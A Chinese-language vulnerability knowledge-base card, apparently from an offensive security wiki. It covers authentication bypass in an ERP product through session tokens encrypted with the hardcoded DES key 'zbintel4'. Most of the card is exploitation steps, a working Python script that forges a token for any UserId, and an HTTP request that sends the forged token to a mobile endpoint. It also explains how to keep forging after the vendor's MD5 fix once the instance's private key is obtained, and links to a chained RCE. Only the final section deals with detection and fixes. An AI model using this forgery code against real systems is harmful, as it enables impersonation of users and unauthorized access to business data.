---
id: web-generic-auth-hardcoded-des-session-forgery
title: 硬编码 DES 密钥与弱结构校验导致 ERP 会话伪造
type: scenario
domain: web
path: web/generic/auth/cookie
technique: hardcoded-des-key-session-token-forgery
aliases:
- zbintel4 会话伪造
- 硬编码 DES 密钥
- MobileSessionStruct 伪造
- __sys_mobile_session
- 九段会话结构
- 离线伪造会话
tags:
- session
- des
- hardcoded-key
- auth-bypass
- cookie
- dotnet
- erp
- token-forgery
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: 旧版 MobileSessionStruct（会话第 1 段为随机数）；新版增加 MD5(RuntimePrivateKey+LoginTime) 校验段
verification:
  verified_by: verifier-V2
  verified_at: '2026-11-04T21:45:52+08:00'
  notes: 已对照原文与截图（MobileSessionStruct/TextCoderClass/IsDataOK/新版 MD5 校验段）核对：DES-CBC key=IV=zbintel4、九段明文、UserId 取第 2 段、仅校验段数与两个有效性条件、新版 MD5(RuntimePrivateKey+LoginTime) 校验，均与原文一致；解密示例 1234|63|SN001|... 也与原文一致。affected_versions 已按原文设置。PoC 未独立执行。
---

## 一句话结论

ERP 的移动会话 `__sys_mobile_session` 是用硬编码 DES 密钥 `zbintel4`（key 与 IV 相同）加密的九段明文，UserId 直接取自第 2 段；掌握该固定密钥即可离线构造任意 UserId 的合法会话，无需窃取真实用户 token 即可通过认证。

## 原理

- 会话串格式为 `hex(DES-CBC(九段明文, key=zbintel4, iv=zbintel4))`。`TextCoderClass.DesDeCode` 把密钥补齐/截取为 8 字节，IV 与密钥相同，DES-CBC 模式，输入输出均为 hex 字符串。
- 九段明文由 `GetSession()` 拼接：
  ```text
  random.Next(100) | UserId | SN | random.Next(100) | IP | LoginTime | random.Next(100) | SessionId | extra
  ```
  第 1、4、7 段只是随机占位值，不参与签名；UserId 在第 2 段；登录时间在第 6 段。
- 服务端 `MobileSessionStruct` 构造函数只做三件事：
  ```csharp
  text = TextCoderClass.DesDeCode(session, "zbintel4");  // 硬编码密钥
  string[] array = BasicsObjectExt.Split(text, "|");
  if (array.Length != 9) { mStructOK = false; return; }   // 仅校验段数
  mStructOK = true;
  UserId = BasicsObjectExt.ToInt(array[1]);               // 直接取第 2 段
  LoginTime = BasicsObjectExt.ToDate(array[5], ...);
  ```
- `IsDataOK()` 只检查两个条件：
  ```csharp
  return ((UserId > 0 && LoginUserType == LoginUserTypeEnum.系统普通账号) || LoginUserType != 0)
         && LoginTime.Year > 2000;
  ```
  没有 HMAC/签名、没有服务端随机挑战、没有与实例绑定，DES 密钥又是全实例共用的硬编码值，因此任何知道密钥的人都能离线伪造。
- 攻击者日志中的 token 解密后为：
  ```text
  1234|63|SN001|5678|127.0.0.1|2026-09-19|abcd|sess001|efgh
  ```
  第 1、4、7 段恰好是旧版 `random.Next(100)` 语义的占位值，说明不是窃取的真实会话，而是手工构造的伪造凭据；UserId=63 为目标真实用户 ID，两个有效性条件均满足。
- 新版修复保留 `zbintel4` 密钥，但在构造函数增加：
  ```csharp
  string text2 = array[5];   // 登录时间
  string text3 = array[0];   // 第 1 段：旧版随机数，新版校验值
  if (ObjectExtClass.MD5(SystemInfoClass.GetRuntimePrivateKey() + text2) != text3) {
      mStructOK = false;
      ExtraTokenError = "会话凭证无效002";
  }
  ```
  `RuntimePrivateKey` 是实例首次初始化时随机生成（Guid+时间戳），以 SQL 标量函数形式固化在业务数据库；离线伪造因此需要先拿到数据库读权限。这也反向证明被攻击实例运行的是不含该 MD5 校验的旧版。

## 触发条件

- 目标使用该 ERP 的移动访问管线，接口接受 `__sys_mobile_session` 参数。
- 版本为旧版 `MobileSessionStruct`（第 1 段为随机数，无 MD5 校验）。
- DES 密钥仍为硬编码 `zbintel4`（新版也未更换）。
- 知道目标存在的 UserId（可从泄露、默认账号、枚举或业务响应推断）。

## 利用步骤

1. 抓取任意带 `__sys_mobile_session` 的请求，确认 token 为 hex 字符串、长度符合 8 字节分组。
2. 用 `zbintel4` 作为 key 和 IV 做 DES-CBC 解密，验证能得到 9 段 `|` 分隔明文。
3. 按九段格式构造明文：第 1/4/7 段填任意数字，第 2 段填目标 UserId，第 6 段填大于 2000 年的登录时间，其余填合法占位值。
4. 用同一密钥 DES-CBC 加密并转 hex，替换请求中的 `__sys_mobile_session`。
5. 访问任意移动端接口（如 `/SYSN/view/comm/AppTemplatePrint.ashx`），观察是否不再返回“会话非法/数据损坏”，而是进入业务逻辑。
6. 若返回“会话凭证无效002”，说明目标已部署 MD5 校验；需要先获取实例 `RuntimePrivateKey`（数据库读权限）才能继续伪造。

## PoC

解密攻击者 token：

```python
from Crypto.Cipher import DES

key = b"zbintel4"
ct = bytes.fromhex(
    "AFBE8575CD7E818896F08695A1BB2BC94E00980BB7AD772EFE1438D2160706242C75FE87103BEEB6473E03D51B076234965138B2927E618BCD52FC71F5E3F31E"
)
pt = DES.new(key, DES.MODE_CBC, key).decrypt(ct)
print(pt.rstrip(b"\x00").decode("utf-8", "ignore"))
# 1234|63|SN001|5678|127.0.0.1|2026-09-19|abcd|sess001|efgh
```

伪造会话（PKCS7 填充，需与目标实现一致）：

```python
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad
import time

key = b"zbintel4"

def forge(user_id, sn="SN001", ip="127.0.0.1", login_time=None):
    login_time = login_time or time.strftime("%Y-%m-%d")
    plain = f"1234|{user_id}|{sn}|5678|{ip}|{login_time}|abcd|sess001|efgh"
    cipher = DES.new(key, DES.MODE_CBC, key)
    return cipher.encrypt(pad(plain.encode(), 8)).hex().upper()

print(forge(63))
```

```http
GET /SYSN/view/comm/AppTemplatePrint.ashx?__sys_mobile_session=<forge(63)> HTTP/1.1
Host: target
```

旧版预期：进入业务逻辑；新版预期：`{"header":{"status":2,"message":"会话非法, 数据损坏。"}}` 或 `会话凭证无效002`。

## 变体与关联

- 变体：UserId 直接取自明文，遍历 1、63、1000 等 ID 可尝试不同身份；`IsDataOK` 只要求 UserId>0、年份>2000。
- 变体：新版保留 `zbintel4` 密钥但增加 MD5 校验段；若通过 SQL 注入、备份泄露或数据库读权限拿到 `RuntimePrivateKey`，仍可伪造。
- 变体：同类自定义 token 常见问题——固定 key、key=IV、无签名、结构校验只数段数、身份字段明文直取。
- 关联：[[web-dotnet-deser-erp-openserverdialog-binaryformatter-rce]] 使用本卡伪造的会话来访问移动管线并触发反序列化 RCE；本卡聚焦认证绕过原语。

## 检测与防御

- 修复：废弃硬编码 DES 密钥，改用带服务端随机盐/HMAC 的签名 token（如 HMAC-SHA256 或 AEAD），密钥按实例生成并安全存储。
- 修复：token 必须包含不可伪造的签名段，覆盖 UserId、登录时间、IP、会话 ID 等全部关键字段；不能只校验段数。
- 修复：增加服务端会话状态或一次性随机数，支持吊销与过期；不要把身份字段明文放在可离线加密的 token 中。
- 加固：迁移到标准框架的会话机制（ASP.NET Session/JWT with signature），避免自研 DES 会话；定期轮换密钥。
- 检测：同一 token 出现在多个 IP/设备、UserId 与登录行为不符、token 第 1 段为旧版随机数语义；监控 `__sys_mobile_session` 解密失败与“会话凭证无效”告警。
- 自查：旧版 token 第 1 段为随机数；新版为 `MD5(RuntimePrivateKey+LoginTime)`。在 `ZBServices.sdk.dll` 搜索 `GetRuntimePrivateKey` 可判断是否已加固。
